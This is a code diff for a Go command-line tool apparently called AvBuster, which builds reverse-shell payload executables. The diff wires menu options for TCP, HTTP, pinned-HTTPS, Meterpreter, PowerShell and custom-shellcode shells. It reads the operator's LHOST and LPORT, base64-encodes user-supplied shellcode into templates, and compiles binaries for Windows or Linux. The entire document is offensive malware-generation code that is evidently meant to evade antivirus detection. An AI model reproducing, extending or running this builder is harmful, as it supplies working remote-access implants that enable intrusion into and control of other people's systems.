@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"bytes"
 	"compress/flate"
+	b64 "encoding/base64"
 	"fmt"
 	"log"
 	"os"
@@ -22,6 +23,7 @@ type DownloadLink struct {
 }
 
 type UserValues struct {
+	userchoice         string
 	lport              string
 	lhost              string
 	shellcode          string
@@ -61,8 +63,8 @@ func main() {
 	for choice != "0" {
 		gr.Println("1. TCP Normal Reverse Shell\t\t2. Hybrid Encrypted Reverse Shell")
 		gr.Println("3. HTTP Reverse Shell      \t\t4.Meterpreter HTTP Shell")
-		gr.Println("5. HTTPS Reverse Shell     \t\t6. Meterpreter HTTPS Shell")
-		gr.Println("7. PowerShell TCP Reverse Shell\t\t8. PowerShell Custom Shell Code")
+		gr.Println("5. HTTPS[Pinned] Reverse Shell     \t\t6. Meterpreter HTTPS Shell")
+		gr.Println("7. PowerShell TCP Reverse Shell\t8. PowerShell Custom Shell Code")
 		gr.Println("9. MS Build TCP Reverse Shell\t\t10. MS Xml Xslt TCP Reverse Shell")
 		gr.Println("11. InstallUtil TCP Reverse Shell\t12. MS ForFiles")
 		rd.Printf("0. Exit\n")
@@ -78,32 +80,6 @@ func main() {
 			//usrvals = readvalues(choice)
 			outpath = filepath.FromSlash("outfiles/gotcprevshell.go")
 			manageroutpath = filepath.FromSlash("outfiles/gotcprevshellmanager.go")
-
-		} else if choice == "2" {
-			//usrvals = readvalues(choice)
-			outpath = filepath.FromSlash("outfiles/hybridshell.go")
-			manageroutpath = filepath.FromSlash("outfiles/hybridmanager.go")
-		} else if choice == "3" {
-			outpath = filepath.FromSlash("outfiles/httprevshell.go")
-			manageroutpath = filepath.FromSlash("outfiles/httprevmngr.go")
-		} else if choice == "4" {
-			//go runWAFTest(geturl, finflag)
-			//<-finflag
-		} else if choice == "5" {
-			outpath = filepath.FromSlash("outfiles/pinnedcert.go")
-			manageroutpath = filepath.FromSlash("outfiles/pinnedcertmanager.go")
-		} else if choice == "6" {
-			//go runCurlGet(geturl, finflag)
-			//<-finflag
-		} else if choice == "7" {
-			usrvals = readvalues(choice)
-			outpath = filepath.FromSlash("outfiles/powrevtcp.go")
-		}
-		if choice == "7" {
-			go createavbusterpayload(usrvals, false, finflag)
-			<-finflag
-			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
-		} else if choice == "1" {
 			usrvals.binarytemplate = binarytemplates.AvBusterTCPSimpleGoReverseShell
 			go createavbusterpayload(usrvals, false, finflag)
 			<-finflag
@@ -113,6 +89,9 @@ func main() {
 			<-finflag
 			ylw.Println("Shellcontroller is ready to use @ " + dwnloadlink.Link)
 		} else if choice == "2" {
+			//usrvals = readvalues(choice)
+			outpath = filepath.FromSlash("outfiles/hybridshell.go")
+			manageroutpath = filepath.FromSlash("outfiles/hybridmanager.go")
 			usrvals.binarytemplate = binarytemplates.AvBusterTCPHybridReverseShell
 			go createavbusterpayload(usrvals, false, finflag)
 			<-finflag
@@ -123,6 +102,8 @@ func main() {
 			<-finflag
 			ylw.Println("Shellcontroller is ready to use @ " + dwnloadlink.Link)
 		} else if choice == "3" {
+			outpath = filepath.FromSlash("outfiles/httprevshell.go")
+			manageroutpath = filepath.FromSlash("outfiles/httprevmngr.go")
 			usrvals.binarytemplate = binarytemplates.AvBusterHttpReverseShell
 			go createavbusterpayload(usrvals, false, finflag)
 			<-finflag
@@ -132,11 +113,14 @@ func main() {
 			<-finflag
 			ylw.Println("Shellcontroller is ready to use @ " + dwnloadlink.Link)
 		} else if choice == "4" {
+			outpath = filepath.FromSlash("outfiles/httpmeterpret.go")
 			usrvals.binarytemplate = binarytemplates.AvBusterHttpMeterPreterShell
 			go createavbusterpayload(usrvals, false, finflag)
 			<-finflag
 			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
 		} else if choice == "5" {
+			outpath = filepath.FromSlash("outfiles/pinnedcert.go")
+			manageroutpath = filepath.FromSlash("outfiles/pinnedcertmanager.go")
 			usrvals.binarytemplate = binarytemplates.AvBusterHttpsPinnedCertReverseShell
 			go createavbusterpayload(usrvals, false, finflag)
 			<-finflag
@@ -145,8 +129,23 @@ func main() {
 			go createavbusterpayload(usrvals, true, finflag)
 			<-finflag
 			ylw.Println("Shellcontroller is ready to use @ " + dwnloadlink.Link)
+
 		} else if choice == "6" {
+			outpath = filepath.FromSlash("outfiles/httpsmeterpret.go")
 			usrvals.binarytemplate = binarytemplates.AvBusterHttpsMeterPreterShell
+			go createavbusterpayload(usrvals, false, finflag)
+			<-finflag
+			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
+		} else if choice == "7" {
+			//usrvals = readvalues(choice)
+			outpath = filepath.FromSlash("outfiles/powrevtcp.go")
+			usrvals.binarytemplate = binarytemplates.AvBusterPowerShellTCPReverseShell
+			go createavbusterpayload(usrvals, false, finflag)
+			<-finflag
+			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
+		} else if choice == "8" {
+			outpath = filepath.FromSlash("outfiles/psrevcustom.go")
+			usrvals.binarytemplate = binarytemplates.AvBusterPowerShellCustomShellCode
 			go createavbusterpayload(usrvals, false, finflag)
 			<-finflag
 			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
@@ -168,48 +167,72 @@ func readvalues(choice string) UserValues {
 	ylw := color.New(color.FgHiYellow, color.Bold)
 	gr := color.New(color.FgHiGreen, color.Bold)
 	bl := color.New(color.FgHiBlue, color.Bold)
-	var fprint, selectedos, selectedarch string
+	var fprint, selectedos, selectedarch, shellcode, lhost, lport string
 	actualusrvals := UserValues{}
-	bl.Printf("(AvBuster) > ")
-	ylw.Printf("Set LHOST : ")
-	lhost, _ := options.ReadString('\n')
-	lhost = removenewline(lhost)
-	bl.Printf("(AvBuster) > ")
-	ylw.Printf("Set LPORT : ")
-	lport, _ := options.ReadString('\n')
-	lport = removenewline(lport)
-
-	if choice == "5" {
+	if choice == "8" {
+		var printshelltype string
+		actualusrvals.userchoice = "8"
 		bl.Printf("(AvBuster) > ")
-		ylw.Printf("Cert Fingerprint : ")
-		fprint, _ = options.ReadString('\n')
-		fprint = removenewline(fprint)
-	}
+		ylw.Printf("Architectue : ")
+		gr.Printf("[1]. 32Bit  [2]. 64Bit : ")
+		arch, _ := options.ReadString('\n')
+		arch = removenewline(arch)
+		if arch == "1" {
+			selectedarch = "386"
+			printshelltype = "32 Bit Shell Code : "
 
-	if choice != "7" {
-		actualusrvals.binarytemplate = binarytemplates.AvBusterPowerShellTCPReverseShell
+		} else {
+			selectedos = "amd64"
+			printshelltype = "64 Bit Shell Code : "
+		}
 		bl.Printf("(AvBuster) > ")
-		ylw.Printf("OSTYPE : ")
-		gr.Printf("[1]. Windows  [2]. Linux : ")
-		ostype, _ := options.ReadString('\n')
-		ostype = removenewline(ostype)
-		if ostype == "1" {
+		ylw.Printf(printshelltype)
+		shellcode, _ = options.ReadString('\n')
+		shellcode = removenewline(shellcode)
+		selectedos = "windows"
+		//compressedshellcode := compresshellcode(shellcode)
+		encodedshellcode := b64.StdEncoding.EncodeToString([]byte(shellcode))
+		shellcode = encodedshellcode
+	} else {
+		bl.Printf("(AvBuster) > ")
+		ylw.Printf("Set LHOST : ")
+		lhost, _ = options.ReadString('\n')
+		lhost = removenewline(lhost)
+		bl.Printf("(AvBuster) > ")
+		ylw.Printf("Set LPORT : ")
+		lport, _ = options.ReadString('\n')
+		lport = removenewline(lport)
+
+		if choice == "5" {
+			bl.Printf("(AvBuster) > ")
+			ylw.Printf("Cert Fingerprint : ")
+			fprint, _ = options.ReadString('\n')
+			fprint = removenewline(fprint)
+		}
+		if choice == "7" {
 			selectedos = "windows"
 		} else {
-			selectedos = "linux"
+			bl.Printf("(AvBuster) > ")
+			ylw.Printf("OSTYPE : ")
+			gr.Printf("[1]. Windows  [2]. Linux : ")
+			ostype, _ := options.ReadString('\n')
+			ostype = removenewline(ostype)
+			if ostype == "1" {
+				selectedos = "windows"
+			} else {
+				selectedos = "linux"
+			}
 		}
-	} else {
-		selectedos = "windows"
-	}
-	bl.Printf("(AvBuster) > ")
-	ylw.Printf("Architectue : ")
-	gr.Printf("[1]. 32Bit  [2]. 64Bit : ")
-	arch, _ := options.ReadString('\n')
-	arch = removenewline(arch)
-	if arch == "1" {
-		selectedarch = "386"
-	} else {
-		selectedos = "amd64"
+		bl.Printf("(AvBuster) > ")
+		ylw.Printf("Architectue : ")
+		gr.Printf("[1]. 32Bit  [2]. 64Bit : ")
+		arch, _ := options.ReadString('\n')
+		arch = removenewline(arch)
+		if arch == "1" {
+			selectedarch = "386"
+		} else {
+			selectedarch = "amd64"
+		}
 	}
 	bl.Printf("(AvBuster) > ")
 	ylw.Printf("Save as : ")
@@ -221,8 +244,18 @@ func readvalues(choice string) UserValues {
 	actualusrvals.targetos = selectedos
 	actualusrvals.targetarchitecture = selectedarch
 	actualusrvals.fingerprint = fprint
+	actualusrvals.shellcode = shellcode
 
 	return actualusrvals
+}
+
+func compresshellcode(source string) []byte {
+	w, _ := flate.NewWriter(nil, 7)
+	buf := new(bytes.Buffer)
+	w.Reset(buf)
+	w.Write([]byte(source))
+	w.Close()
+	return buf.Bytes()
 }
 
 func avbusterbuildexe(exepath, gofilepath, ostype, arch string) {
@@ -344,7 +377,7 @@ func readandreplacefilecontent(ipport string) string {
 }
 
 func createavbusterpayload(userselectedval UserValues, ismanager bool, finflag chan string) {
-	var setpath string
+	var setpath, valuetowrite string
 	if ismanager {
 		dwnloadlink.Link = "download/" + userselectedval.saveas + "manager" + ".exe"
 
@@ -357,6 +390,7 @@ func createavbusterpayload(userselectedval UserValues, ismanager bool, finflag c
 	//if ismanager {
 	//fmt.Println(setpath)
 	//}
+	//fmt.Println(userselectedval.binarytemplate)
 	ipandport := userselectedval.lhost + ":" + userselectedval.lport
 	ipandportreplaced := strings.Replace(userselectedval.binarytemplate, "REVIPPORT", ipandport, 1)
 	finalval := strings.Replace(ipandportreplaced, "FPRINT", userselectedval.fingerprint, 1)
@@ -365,13 +399,18 @@ func createavbusterpayload(userselectedval UserValues, ismanager bool, finflag c
 	replaceunwantedchars := strings.Replace(managerfinalval, "RPL", "`", -1)
 	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", userselectedval.lhost, 1)
 	portreplaced := strings.Replace(ipreplaced, "RPORT", userselectedval.lport, 1)
+	valuetowrite = strings.Replace(portreplaced, "SHELLCODE", userselectedval.shellcode, 1)
 
+	fmt.Println(valuetowrite)
+
+	//fmt.Println(setpath)
 	newFile, err := os.Create(setpath)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer newFile.Close()
-	newFile.WriteString(portreplaced)
+	newFile.WriteString(valuetowrite)
+
 	avbusterbuildexe(dwnloadlink.Link, setpath, userselectedval.targetos, userselectedval.targetarchitecture)
 	finflag <- "build succeed"
 }
